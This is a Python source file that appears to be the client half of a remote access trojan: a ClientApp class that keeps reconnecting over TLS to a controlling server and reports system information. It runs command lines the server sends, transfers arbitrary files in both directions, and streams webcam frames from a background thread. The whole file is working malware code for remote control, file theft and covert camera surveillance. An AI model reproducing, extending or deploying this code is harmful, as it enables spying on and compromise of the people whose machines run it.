from __future__ import annotations

import platform
import socket
import ssl
import threading
import time
import uuid
from contextlib import suppress
from pathlib import Path

from rat.client.commands import parse_and_run
from rat.client.file_transfer import FileTransferState
from rat.client.state import ClientState
from rat.core.logging import LogSettings, setup_logging
from rat.core.rpc import RPCPeer, RPCRequest
from rat.core.system_info import collect_system_info
from rat.core.tls import TLSPaths, create_client_context


class ClientApp:
    def __init__(self, host: str, port: int, tls_paths: TLSPaths, server_name: str) -> None:
        self.log = setup_logging(LogSettings(name="rat.client", filename="client.log"))
        self.host = host
        self.port = port
        self.server_name = server_name
        self.tls_paths = tls_paths
        self._ctx = create_client_context(tls_paths)
        self._state = ClientState()
        self._xfer = FileTransferState()
        self._peer: RPCPeer | None = None
        self._stop = threading.Event()

    def run_forever(self) -> None:
        while not self._stop.is_set():
            try:
                self._connect_once()
            except Exception as exc:
                self.log.error("connect error: %s", exc)
            time.sleep(2.0)

    def stop(self) -> None:
        self._stop.set()
        if self._peer is not None:
            self._peer.close()

    def _connect_once(self) -> None:
        raw = socket.create_connection((self.host, self.port), timeout=10)
        try:
            conn: ssl.SSLSocket = self._ctx.wrap_socket(raw, server_hostname=self.server_name)
        except Exception:
            raw.close()
            raise

        peer = RPCPeer(conn, name="client", logger=self.log)
        self._peer = peer

        peer.on("run", self._handle_run)
        peer.on("download_init", self._handle_download_init)
        peer.on("download_chunk", self._handle_download_chunk)
        peer.on("download_finish", self._handle_download_finish)
        peer.on("upload_init", self._handle_upload_init)
        peer.on("upload_chunk", self._handle_upload_chunk)
        peer.on("upload_finish", self._handle_upload_finish)
        peer.on("webcam_stream_start", self._handle_webcam_stream_start)
        peer.on("webcam_stream_stop", self._handle_webcam_stream_stop)

        peer.start()
        peer.send_event("hello", collect_system_info().to_dict())
        self.log.info("Connected to server %s:%s (TLS)", self.host, self.port)

        while not peer.is_closed() and not self._stop.is_set():
            time.sleep(0.5)

        self.log.info("Disconnected.")

    def _handle_run(self, req: RPCRequest):
        line = str(req.args.get("line", "")).strip()
        res = parse_and_run(self._state, line)
        if res.ok:
            return {"ok": True, "data": res.data}
        return {"ok": False, "error": res.data.get("error", "command failed"), "data": res.data}

    def _handle_download_init(self, req: RPCRequest):
        path = Path(str(req.args.get("path", "")))
        token, size = self._xfer.download_prepare(path)
        return {"token": token, "size": size, "name": path.name}

    def _handle_download_chunk(self, req: RPCRequest):
        token = str(req.args.get("token", ""))
        offset = int(req.args.get("offset", 0))
        length = int(req.args.get("length", 65536))
        chunk = self._xfer.download_read(token, offset, length)
        return {"chunk": chunk, "offset": offset, "length": len(chunk)}

    def _handle_download_finish(self, req: RPCRequest):
        token = str(req.args.get("token", ""))
        self._xfer.download_finish(token)
        return {"status": "ok"}

    def _handle_upload_init(self, req: RPCRequest):
        path = Path(str(req.args.get("path", "")))
        size = int(req.args.get("size", 0))
        token = self._xfer.upload_prepare(path, size)
        return {"token": token}

    def _handle_upload_chunk(self, req: RPCRequest):
        token = str(req.args.get("token", ""))
        offset = int(req.args.get("offset", 0))
        chunk = req.args.get("chunk", b"")
        if not isinstance(chunk, bytes | bytearray):
            raise TypeError("chunk must be bytes")
        self._xfer.upload_write(token, offset, bytes(chunk))
        return {"status": "ok", "offset": offset, "length": len(chunk)}

    def _handle_upload_finish(self, req: RPCRequest):
        token = str(req.args.get("token", ""))
        self._xfer.upload_finish(token)
        return {"status": "ok"}

    def _handle_webcam_stream_start(self, req: RPCRequest):
        fps = float(req.args.get("fps", 5.0))
        fps = max(1.0, min(fps, 20.0))
        if self._peer is None:
            raise RuntimeError("No peer")
        if self._state.webcam_stream_running:
            return {"token": self._state.webcam_stream_token}
        token = str(uuid.uuid4())
        self._state.webcam_stream_running = True
        self._state.webcam_stream_token = token
        threading.Thread(
            target=self._webcam_stream_loop, args=(token, fps), name="webcam-stream", daemon=True
        ).start()
        return {"token": token, "fps": fps}

    def _handle_webcam_stream_stop(self, req: RPCRequest):
        self._state.webcam_stream_running = False
        old = self._state.webcam_stream_token
        self._state.webcam_stream_token = None
        return {"stopped": True, "token": old}

    def _webcam_stream_loop(self, token: str, fps: float) -> None:
        cap = None
        try:
            import cv2

            backend = cv2.CAP_DSHOW if platform.system().lower().startswith("win") else 0
            cap = cv2.VideoCapture(0, backend)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, fps)
            if not cap.isOpened():
                self.log.warning("webcam not available")
                return
            delay = 1.0 / fps
            warmed_frame = None
            warmup_deadline = time.time() + 2.0
            while time.time() < warmup_deadline:
                ok, frame = cap.read()
                if ok:
                    warmed_frame = frame
                    break
                time.sleep(0.05)
            if warmed_frame is None:
                self.log.warning("webcam stream could not read initial frame")
                return
            while (
                self._state.webcam_stream_running
                and self._peer is not None
                and not self._peer.is_closed()
            ):
                frame = warmed_frame
                warmed_frame = None
                if frame is None:
                    ok, frame = cap.read()
                    if not ok:
                        time.sleep(delay)
                        continue
                ok2, buf = cv2.imencode(".jpg", frame)
                if not ok2:
                    time.sleep(delay)
                    continue
                self._peer.send_event(
                    "webcam_frame",
                    {"token": token, "jpeg": buf.tobytes(), "ts": time.time()},
                )
                time.sleep(delay)
        except Exception as exc:
            self.log.warning("webcam_stream_loop error: %s", exc)
        finally:
            self._state.webcam_stream_running = False
            self._state.webcam_stream_token = None
            with suppress(Exception):
                if cap is not None:
                    cap.release()
